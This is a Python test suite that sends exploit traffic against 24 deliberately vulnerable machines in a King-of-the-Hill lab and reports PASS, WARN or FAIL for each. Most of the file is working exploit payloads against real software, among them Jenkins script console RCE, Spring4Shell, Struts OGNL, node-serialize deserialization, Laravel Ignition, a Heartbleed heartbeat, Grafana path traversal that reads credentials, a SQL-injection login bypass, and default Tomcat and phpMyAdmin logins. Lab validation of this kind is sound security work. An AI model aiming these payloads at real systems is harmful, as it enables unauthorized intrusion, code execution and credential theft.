#!/usr/bin/env python3
"""Vulnerability exposure suite for the KoTH stack.

This script exercises one probe per challenge machine (24 targets: H1A..H8C)
and reports PASS / WARN / FAIL + a short proof string. It is designed for
*authorized* lab / staging environments only — each probe sends genuine
exploit traffic.

Architecture
------------

The old version of this file was 528 lines of 24 near-identical
``check_h*`` functions that differed only in URL, payload, and success
marker. The new layout splits the probe surface into two layers:

* An ``HttpMarkerProbe`` dataclass + ``run_http_marker_probe`` dispatcher
  handles any check that boils down to "send one HTTP request, look for a
  marker string in the response." A ``HTTP_MARKER_PROBES`` registry holds
  the per-target configuration. Adding a new HTTP-only probe is a dict
  entry, not a new function.

* Genuinely different probes (multipart upload + verify, stateful login +
  RCE, raw TCP / UDP binary exchanges, external-tool fallbacks) keep their
  own functions. Those are the probes where the control flow is part of
  the test, not just the parameters.

The combined ``CHECKS`` registry at the bottom plus the ``main()`` loop
means the two layers compose cleanly.
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import re
import tempfile
import time
import urllib.parse
from collections.abc import Callable, Mapping
from dataclasses import dataclass, field
from typing import Literal

from common import (
    CheckResult,
    SNMP_SYS_DESCR_GET,
    command_exists,
    http_request,
    make_cookie_opener,
    multipart_form_data,
    print_table,
    run_command,
    tcp_roundtrip,
    udp_roundtrip,
    url_for,
    write_json,
)
from targets import TARGETS, selected_targets


# ---------------------------------------------------------------------------
# Result helpers. ``ok`` / ``warn`` / ``fail`` stamp the latency and build a
# ``CheckResult`` — kept as tiny shims so probe functions read top-down
# without noise.
# ---------------------------------------------------------------------------
def ok(name: str, proof: str, detail: str, started: float, evidence: str = "") -> CheckResult:
    return CheckResult(name, "PASS", proof, detail, (time.perf_counter() - started) * 1000.0, evidence)


def warn(name: str, proof: str, detail: str, started: float, evidence: str = "") -> CheckResult:
    return CheckResult(name, "WARN", proof, detail, (time.perf_counter() - started) * 1000.0, evidence)


def fail(name: str, proof: str, detail: str, started: float, evidence: str = "") -> CheckResult:
    return CheckResult(name, "FAIL", proof, detail, (time.perf_counter() - started) * 1000.0, evidence)


def extract_text(blob: bytes) -> str:
    return blob.decode("utf-8", errors="ignore")


# ---------------------------------------------------------------------------
# HTTP marker probe: a declarative description of an HTTP request plus the
# string we expect to see in the response. Handles the overwhelmingly
# common "send one request, grep one token" probe shape.
# ---------------------------------------------------------------------------
@dataclass(frozen=True)
class HttpMarkerProbe:
    target: str
    proof: str
    marker: str
    success_detail: str
    path: str = "/"
    method: str = "GET"
    headers: Mapping[str, str] = field(default_factory=dict)
    form: Mapping[str, str] | None = None
    json_body: object = None
    raw_body: bytes | None = None
    # Status predicate: returns True when the HTTP status code counts as
    # "probe-reached-the-endpoint". Separated from the marker check so a
    # probe can accept any 2xx if that's meaningful (e.g. traversal).
    status_predicate: Callable[[int], bool] = lambda status: status == 200
    # Result kind when the marker is found. Fingerprint-only probes (e.g.
    # "Drupal 7 is present but Drupalgeddon2 still needs manual work") use
    # WARN so CI can tell them apart from full exploitations.
    result_on_match: Literal["PASS", "WARN"] = "PASS"
    # How much of the response body to snapshot as evidence.
    evidence_len: int = 200
    # Optional override for the failure detail. Defaults to f"{proof} probe
    # failed." with the observed status appended.
    failure_detail: str | None = None


def run_http_marker_probe(host: str, timeout: float, probe: HttpMarkerProbe) -> CheckResult:
    started = time.perf_counter()

    # Body derivation: forms, JSON, and raw bytes are mutually exclusive.
    # Pre-compute Content-Type only when we're providing a body shape that
    # implies one, so callers can still override with explicit ``headers``.
    headers: dict[str, str] = dict(probe.headers)
    if probe.form is not None:
        body: bytes | None = urllib.parse.urlencode(probe.form).encode()
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
    elif probe.json_body is not None:
        body = json.dumps(probe.json_body).encode()
        headers.setdefault("Content-Type", "application/json")
    else:
        body = probe.raw_body

    status, response, _ = http_request(
        url_for(host, TARGETS[probe.target].port, "http", probe.path),
        method=probe.method,
        headers=headers,
        data=body,
        timeout=timeout,
    )
    text = extract_text(response)
    evidence = text[: probe.evidence_len]
    if probe.status_predicate(status) and probe.marker in text:
        result_fn = ok if probe.result_on_match == "PASS" else warn
        return result_fn(probe.target, probe.proof, probe.success_detail, started, evidence.strip())
    failure = probe.failure_detail or f"{probe.proof} probe failed."
    return fail(probe.target, probe.proof, f"{failure} status={status}", started, evidence)


# ---------------------------------------------------------------------------
# Registry of HTTP marker probes. One entry per target; each is a pure
# description of "what request to send, what string must come back." Adding
# a new HTTP-only probe is an entry in this dict — no new function needed.
# ---------------------------------------------------------------------------
HTTP_MARKER_PROBES: dict[str, HttpMarkerProbe] = {
    "machineH1C": HttpMarkerProbe(
        target="machineH1C",
        proof="rce",
        path="/?ip=" + urllib.parse.quote("127.0.0.1;printf h1c_ok"),
        marker="h1c_ok",
        success_detail="Ping diagnostics endpoint executed the injected command.",
    ),
    "machineH2A": HttpMarkerProbe(
        target="machineH2A",
        proof="rce",
        method="POST",
        path="/scriptText",
        form={"script": "println('h2a_ok')"},
        marker="h2a_ok",
        success_detail="Jenkins script console executed a Groovy probe without auth.",
    ),
    "machineH2C": HttpMarkerProbe(
        target="machineH2C",
        proof="default-creds",
        path="/manager/text/list",
        headers={"Authorization": f"Basic {base64.b64encode(b'tomcat:tomcat').decode()}"},
        marker="OK - Listed applications",
        success_detail="Tomcat manager accepted the default tomcat:tomcat credential.",
        failure_detail="Tomcat manager did not accept default creds.",
    ),
    "machineH3B": HttpMarkerProbe(
        target="machineH3B",
        proof="fingerprint",
        path="/CHANGELOG.txt",
        marker="Drupal 7",
        result_on_match="WARN",
        success_detail="Drupal 7 fingerprint confirmed. Drupalgeddon2 execution remains a manual follow-up.",
        failure_detail="Drupal fingerprint not found.",
    ),
    "machineH3C": HttpMarkerProbe(
        target="machineH3C",
        proof="file-read",
        path="/.git/HEAD",
        marker="refs/heads/",
        success_detail="The exposed .git directory leaked repository metadata.",
        failure_detail=".git/HEAD was not exposed.",
    ),
    "machineH4A": HttpMarkerProbe(
        target="machineH4A",
        proof="rce",
        method="POST",
        path="/profile",
        # node-serialize looks for the magic ``_$$ND_FUNC$$_`` tag inside a
        # nested ``profile`` string.
        json_body={
            "profile": json.dumps(
                {
                    "probe": (
                        "_$$ND_FUNC$$_function(){return require('child_process')."
                        "execSync('printf h4a_ok').toString()}()"
                    )
                }
            )
        },
        marker="h4a_ok",
        success_detail="node-serialize deserialization executed the probe command.",
        failure_detail="node-serialize probe failed.",
    ),
    "machineH4B": HttpMarkerProbe(
        target="machineH4B",
        proof="rce",
        method="POST",
        path="/greeting",
        form={"class.module.classLoader": "1", "cmd": "printf h4b_ok"},
        marker="h4b_ok",
        success_detail="Spring4Shell stub executed the provided command as springuser.",
        failure_detail="Spring4Shell probe failed.",
    ),
    "machineH4C": HttpMarkerProbe(
        target="machineH4C",
        proof="ssrf-rce",
        path=(
            "/?url="
            + urllib.parse.quote("http://127.0.0.1:1337/api/exec?cmd=printf%20h4c_ok", safe="")
        ),
        marker="h4c_ok",
        success_detail="The SSRF fetcher reached the internal root exec API.",
        failure_detail="SSRF probe did not surface the command output.",
    ),
    "machineH5A": HttpMarkerProbe(
        target="machineH5A",
        proof="rce",
        method="POST",
        path="/password_change.cgi",
        form={"user": "root", "old": "x|printf h5a_ok", "new1": "a", "new2": "a"},
        marker="h5a_ok",
        success_detail="Webmin password change probe executed a command pre-auth.",
        failure_detail="Webmin probe failed.",
    ),
    "machineH5B": HttpMarkerProbe(
        target="machineH5B",
        proof="rce",
        method="POST",
        path="/_search",
        json_body={"script": "Runtime.getRuntime().exec('printf h5b_ok')"},
        marker="h5b_ok",
        success_detail="Elasticsearch dynamic scripting executed a probe command.",
        failure_detail="Dynamic scripting probe failed.",
    ),
    "machineH5C": HttpMarkerProbe(
        target="machineH5C",
        proof="rce",
        method="POST",
        path="/login.action",
        # The Struts OGNL payload rides on the Content-Type header itself,
        # so we build both the header and an empty body by hand.
        headers={"Content-Type": '%{exec("printf h5c_ok")}'},
        raw_body=b"",
        marker="h5c_ok",
        success_detail="Struts content-type OGNL probe executed the command.",
        failure_detail="Struts probe failed.",
    ),
    "machineH8B": HttpMarkerProbe(
        target="machineH8B",
        proof="ssti",
        path="/?name=" + urllib.parse.quote("{{7*7}}"),
        marker="Hello, 49!",
        success_detail="Jinja2 rendered attacker-controlled template syntax.",
        failure_detail="SSTI marker was not rendered.",
    ),
    "machineH8C": HttpMarkerProbe(
        target="machineH8C",
        proof="rce",
        method="POST",
        path="/_ignition/execute-solution",
        json_body={
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "username",
                "viewFile": "phar://qa-probe",
                "cmd": "printf h8c_ok",
            },
        },
        marker="h8c_ok",
        success_detail="Laravel Ignition execute-solution endpoint returned the command output.",
        failure_detail="Ignition probe failed.",
    ),
}


# ---------------------------------------------------------------------------
# Specialty probes. These do not fit the "one request, one marker" shape
# — they need multipart uploads + verify fetches, stateful cookie login
# sequences, raw TCP/UDP frames, or external tool fall-backs. Each one
# keeps its own function because the control flow *is* the test.
# ---------------------------------------------------------------------------
def check_h1a(host: str, timeout: float) -> CheckResult:
    """H1A — WordPress Reflex Gallery unauthenticated upload: POST a probe
    file, then GET it back from ``/wp-content/uploads/`` to prove the
    write landed.
    """
    started = time.perf_counter()
    body, content_type = multipart_form_data(
        {"action": "UploadHandler"},
        [("file", "qa_probe.txt", b"h1a_upload_ok\n", "text/plain")],
    )
    status, response, _ = http_request(
        url_for(host, TARGETS["machineH1A"].port, "http", "/wp-content/plugins/reflex-gallery/reflex-gallery.php"),
        method="POST",
        headers={"Content-Type": content_type},
        data=body,
        timeout=timeout,
    )
    text = extract_text(response)
    if status == 200 and "/wp-content/uploads/qa_probe.txt" in text:
        fetch_status, fetch_body, _ = http_request(
            url_for(host, TARGETS["machineH1A"].port, "http", "/wp-content/uploads/qa_probe.txt"),
            timeout=timeout,
        )
        if fetch_status == 200 and "h1a_upload_ok" in extract_text(fetch_body):
            return ok(
                "machineH1A",
                "unauth-upload",
                "Reflex Gallery upload handler accepted and served a probe file.",
                started,
                extract_text(fetch_body).strip(),
            )
    return fail(
        "machineH1A",
        "unauth-upload",
        f"Upload handler did not return the expected file path. status={status}",
        started,
        text[:200],
    )


def check_h1b(host: str, timeout: float) -> CheckResult:
    """H1B — Redis unauth PING. Raw RESP, not HTTP."""
    started = time.perf_counter()
    latency_ms, body = tcp_roundtrip(
        host, TARGETS["machineH1B"].port, send=b"*1\r\n$4\r\nPING\r\n", timeout=timeout
    )
    text = extract_text(body)
    if "PONG" in text:
        return CheckResult(
            "machineH1B", "PASS", "unauth-service", "Redis accepted an unauthenticated PING.", latency_ms, text.strip()
        )
    return fail("machineH1B", "unauth-service", "Redis did not return PONG.", started, text[:200])


def check_h2b(host: str, timeout: float) -> CheckResult:
    """H2B — SQLi login bypass followed by command injection in the admin
    panel. Needs a shared cookie jar across the two requests.
    """
    started = time.perf_counter()
    opener = make_cookie_opener()
    login = urllib.parse.urlencode({"username": "' OR '1'='1", "password": "' OR '1'='1"}).encode()
    http_request(
        url_for(host, TARGETS["machineH2B"].port, "http", "/index.php"),
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=login,
        timeout=timeout,
        opener=opener,
    )
    exploit = urllib.parse.urlencode({"dir": ".; printf h2b_ok"}).encode()
    status, body, _ = http_request(
        url_for(host, TARGETS["machineH2B"].port, "http", "/admin.php"),
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=exploit,
        timeout=timeout,
        opener=opener,
    )
    text = extract_text(body)
    if status == 200 and "h2b_ok" in text:
        return ok("machineH2B", "rce", "SQLi login bypass reached the admin command injection sink.", started, "h2b_ok")
    return fail("machineH2B", "rce", f"Admin panel did not return the injection marker. status={status}", started, text[:200])


def check_h3a(host: str, timeout: float) -> CheckResult:
    """H3A — SMB anonymous share listing via smbclient, with a TCP-fingerprint
    fallback when smbclient is not available on the runner.
    """
    started = time.perf_counter()
    if command_exists("smbclient"):
        proc = run_command(
            ["smbclient", "-N", f"//{host}/", "-p", str(TARGETS["machineH3A"].port), "-L"],
            timeout=timeout + 10,
        )
        merged = (proc.stdout or "") + (proc.stderr or "")
        if proc.returncode == 0 and ("Disk" in merged or "public" in merged.lower()):
            return ok("machineH3A", "anon-share", "smbclient listed shares anonymously.", started, merged[:200].strip())
        return fail("machineH3A", "anon-share", f"smbclient failed with rc={proc.returncode}", started, merged[:200])

    try:
        latency_ms, _ = tcp_roundtrip(host, TARGETS["machineH3A"].port, timeout=timeout, recv_bytes=0)
        return CheckResult(
            "machineH3A",
            "WARN",
            "fingerprint",
            "Port 445 is reachable, but anonymous share validation needs smbclient.",
            latency_ms,
            "install smbclient for full coverage",
        )
    except OSError as exc:
        return fail("machineH3A", "anon-share", f"SMB port not reachable: {exc}", started)


def check_h6a(host: str, timeout: float) -> CheckResult:
    """H6A — distccd + NFS TCP fingerprint. Full distcc/NFS exploitation
    needs protocol-specific tooling, so this probe stops at "both sockets
    answer" and returns WARN.
    """
    started = time.perf_counter()
    try:
        distcc_ms, _ = tcp_roundtrip(host, TARGETS["machineH6A"].port, timeout=timeout, recv_bytes=0)
        nfs_ms, _ = tcp_roundtrip(host, 10051, timeout=timeout, recv_bytes=0)
        detail = f"distcc_ms={distcc_ms:.2f}, nfs_ms={nfs_ms:.2f}"
        return warn(
            "machineH6A",
            "fingerprint",
            "distccd and NFS ports are reachable. Full exploitation needs protocol-specific tooling.",
            started,
            detail,
        )
    except OSError as exc:
        return fail("machineH6A", "fingerprint", f"One of the H6A ports was unreachable: {exc}", started)


def check_h6b(host: str, timeout: float) -> CheckResult:
    """H6B — MongoDB unauthenticated data read via mongosh, falling back to
    a TCP fingerprint when mongosh is missing.
    """
    started = time.perf_counter()
    if command_exists("mongosh"):
        proc = run_command(
            [
                "mongosh",
                f"mongodb://{host}:{TARGETS['machineH6B'].port}/kothdb",
                "--quiet",
                "--eval",
                "JSON.stringify(db.users.findOne({username:'mongouser'}))",
            ],
            timeout=timeout + 10,
        )
        merged = (proc.stdout or "") + (proc.stderr or "")
        if proc.returncode == 0 and "mongouser" in merged:
            return ok(
                "machineH6B",
                "db-read",
                "MongoDB returned seeded user data without authentication.",
                started,
                merged.strip()[:200],
            )
        return fail("machineH6B", "db-read", f"mongosh query failed with rc={proc.returncode}", started, merged[:200])

    try:
        latency_ms, _ = tcp_roundtrip(host, TARGETS["machineH6B"].port, timeout=timeout, recv_bytes=0)
        return CheckResult(
            "machineH6B",
            "WARN",
            "fingerprint",
            "MongoDB port is reachable, but seeded-data validation needs mongosh.",
            latency_ms,
            "install mongosh for full coverage",
        )
    except OSError as exc:
        return fail("machineH6B", "db-read", f"MongoDB port not reachable: {exc}", started)


def check_h6c(host: str, timeout: float) -> CheckResult:
    """H6C — Heartbleed memory leak. Binary payload over raw TCP."""
    started = time.perf_counter()
    heartbeat = b"\x18\x03\x02\x00\x03\x01\x00\x80"
    _, body = tcp_roundtrip(host, TARGETS["machineH6C"].port, send=heartbeat, timeout=timeout)
    if b"ssh_password=web123" in body and b"username=webuser" in body:
        return ok(
            "machineH6C",
            "memory-leak",
            "Heartbleed probe leaked the embedded session data.",
            started,
            extract_text(body)[:200],
        )
    return fail(
        "machineH6C",
        "memory-leak",
        "Heartbeat response did not leak the expected session data.",
        started,
        extract_text(body)[:200],
    )


def check_h7a(host: str, timeout: float) -> CheckResult:
    """H7A — SNMP public community leaking the process table and therefore
    the SSH credential for the privesc path. snmpwalk preferred; falls
    back to a UDP get_request fingerprint.
    """
    started = time.perf_counter()
    if command_exists("snmpwalk"):
        proc = run_command(
            ["snmpwalk", "-v1", "-c", "public", f"{host}:{TARGETS['machineH7A'].port}", "1.3.6.1.2.1.25.4.2.1.5"],
            timeout=timeout + 10,
        )
        merged = (proc.stdout or "") + (proc.stderr or "")
        if proc.returncode == 0 and ("opsuser" in merged or "snmpops" in merged):
            return ok(
                "machineH7A",
                "cred-leak",
                "SNMP exposed the process list containing the leaked SSH credential.",
                started,
                merged[:200].strip(),
            )
        return fail("machineH7A", "cred-leak", f"snmpwalk failed with rc={proc.returncode}", started, merged[:200])

    try:
        latency_ms, body = udp_roundtrip(host, TARGETS["machineH7A"].port, SNMP_SYS_DESCR_GET, timeout=timeout)
        if body:
            return CheckResult(
                "machineH7A",
                "WARN",
                "fingerprint",
                "SNMP public community responded, but process-list credential validation needs snmpwalk.",
                latency_ms,
                f"bytes={len(body)}",
            )
        return fail("machineH7A", "fingerprint", "SNMP did not return a response.", started)
    except OSError as exc:
        return fail("machineH7A", "fingerprint", f"SNMP probe failed: {exc}", started)


def check_h7b(host: str, timeout: float) -> CheckResult:
    """H7B — Grafana path traversal exposes admin credentials; a follow-up
    login + admin-exec hits a stubbed command-execution endpoint.
    """
    started = time.perf_counter()
    traversal = "/public/plugins/text/../../../../../../../etc/grafana/grafana.ini"
    status, body, _ = http_request(url_for(host, TARGETS["machineH7B"].port, "http", traversal), timeout=timeout)
    text = extract_text(body)
    if status != 200:
        return fail(
            "machineH7B",
            "traversal-rce",
            f"Grafana traversal did not return grafana.ini. status={status}",
            started,
            text[:200],
        )

    user_match = re.search(r"admin_user\s*=\s*(\S+)", text)
    pass_match = re.search(r"admin_password\s*=\s*(\S+)", text)
    username = user_match.group(1) if user_match else "admin"
    password = pass_match.group(1) if pass_match else "admin"

    opener = make_cookie_opener()
    login = urllib.parse.urlencode({"user": username, "password": password}).encode()
    http_request(
        url_for(host, TARGETS["machineH7B"].port, "http", "/login"),
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=login,
        timeout=timeout,
        opener=opener,
    )
    exec_status, exec_body, _ = http_request(
        url_for(host, TARGETS["machineH7B"].port, "http", "/api/admin/exec?cmd=printf%20h7b_ok"),
        timeout=timeout,
        opener=opener,
    )
    exec_text = extract_text(exec_body)
    if exec_status == 200 and "h7b_ok" in exec_text:
        return ok(
            "machineH7B",
            "traversal-rce",
            "Path traversal exposed Grafana creds and the admin exec endpoint ran a probe command.",
            started,
            "h7b_ok",
        )
    return fail(
        "machineH7B",
        "traversal-rce",
        f"Traversal worked but admin exec did not return the probe marker. status={exec_status}",
        started,
        exec_text[:200],
    )


def check_h7c(host: str, timeout: float) -> CheckResult:
    """H7C — Anonymous rsync upload to the public module. Requires the rsync
    client binary; falls back to a banner fingerprint.
    """
    started = time.perf_counter()
    if command_exists("rsync"):
        with tempfile.NamedTemporaryFile("w", delete=False, encoding="utf-8") as handle:
            handle.write("h7c_rsync_ok\n")
            local_path = handle.name
        try:
            proc = run_command(
                ["rsync", local_path, f"rsync://{host}:{TARGETS['machineH7C'].port}/public/qa_probe.txt"],
                timeout=timeout + 10,
            )
            merged = (proc.stdout or "") + (proc.stderr or "")
            if proc.returncode == 0:
                return ok(
                    "machineH7C",
                    "anon-write",
                    "Anonymous rsync upload to the public module succeeded.",
                    started,
                    "qa_probe.txt uploaded",
                )
            return fail("machineH7C", "anon-write", f"rsync upload failed with rc={proc.returncode}", started, merged[:200])
        finally:
            try:
                os.unlink(local_path)
            except OSError:
                pass

    try:
        latency_ms, body = tcp_roundtrip(host, TARGETS["machineH7C"].port, timeout=timeout)
        text = extract_text(body)
        if "@RSYNCD:" in text:
            return CheckResult(
                "machineH7C",
                "WARN",
                "fingerprint",
                "rsync daemon is reachable, but anonymous write validation needs the rsync client binary.",
                latency_ms,
                text.strip(),
            )
        return fail("machineH7C", "fingerprint", "rsync banner missing.", started, text[:200])
    except OSError as exc:
        return fail("machineH7C", "anon-write", f"rsync port not reachable: {exc}", started)


def check_h8a(host: str, timeout: float) -> CheckResult:
    """H8A — phpMyAdmin default root login (blank password) + a SQL probe
    via the admin UI.
    """
    started = time.perf_counter()
    opener = make_cookie_opener()
    login = urllib.parse.urlencode({"pma_username": "root", "pma_password": ""}).encode()
    http_request(
        url_for(host, TARGETS["machineH8A"].port, "http", "/index.php"),
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=login,
        timeout=timeout,
        opener=opener,
    )
    sql = urllib.parse.urlencode({"sql": "SELECT 1337 AS qa_probe;"}).encode()
    status, body, _ = http_request(
        url_for(host, TARGETS["machineH8A"].port, "http", "/index.php"),
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=sql,
        timeout=timeout,
        opener=opener,
    )
    text = extract_text(body)
    if status == 200 and "qa_probe" in text and "1337" in text:
        return ok(
            "machineH8A",
            "auth-bypass",
            "phpMyAdmin accepted root with a blank password and executed SQL.",
            started,
            "qa_probe=1337",
        )
    return fail("machineH8A", "auth-bypass", f"phpMyAdmin probe failed. status={status}", started, text[:200])


# ---------------------------------------------------------------------------
# Combined dispatcher table.
#
# ``CHECKS[target_name]`` is always a callable of ``(host, timeout) -> CheckResult``.
# The HTTP_MARKER_PROBES entries are lifted here into closures that capture
# their config; specialty functions go in unchanged.
# ---------------------------------------------------------------------------
def _marker_probe_callable(probe: HttpMarkerProbe) -> Callable[[str, float], CheckResult]:
    def _run(host: str, timeout: float) -> CheckResult:
        return run_http_marker_probe(host, timeout, probe)

    return _run


CHECKS: dict[str, Callable[[str, float], CheckResult]] = {
    name: _marker_probe_callable(probe) for name, probe in HTTP_MARKER_PROBES.items()
}
CHECKS.update(
    {
        "machineH1A": check_h1a,
        "machineH1B": check_h1b,
        "machineH2B": check_h2b,
        "machineH3A": check_h3a,
        "machineH6A": check_h6a,
        "machineH6B": check_h6b,
        "machineH6C": check_h6c,
        "machineH7A": check_h7a,
        "machineH7B": check_h7b,
        "machineH7C": check_h7c,
        "machineH8A": check_h8a,
    }
)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Vulnerability exposure suite for the KoTH stack.")
    parser.add_argument("--host", default="127.0.0.1", help="Target host running the competition stack.")
    parser.add_argument("--targets", help="Comma-separated target list. Defaults to all machines.")
    parser.add_argument("--timeout", type=float, default=5.0, help="Per-check timeout in seconds.")
    parser.add_argument("--json-out", help="Write structured results to this JSON file.")
    parser.add_argument("--fail-on-warn", action="store_true", help="Exit non-zero if any check returns WARN.")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    targets = selected_targets(args.targets)
    results = [CHECKS[target.name](args.host, args.timeout) for target in targets]

    rows = [
        [
            result.name,
            result.status,
            result.proof,
            f"{result.latency_ms:.2f}" if result.latency_ms is not None else "",
            result.detail,
        ]
        for result in results
    ]
    print_table(["Target", "Status", "Proof", "Latency ms", "Detail"], rows)

    if args.json_out:
        write_json(
            args.json_out,
            {
                "host": args.host,
                "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "results": results,
            },
        )

    failed = any(result.status == "FAIL" for result in results)
    warned = any(result.status == "WARN" for result in results)
    if failed or (warned and args.fail_on_warn):
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
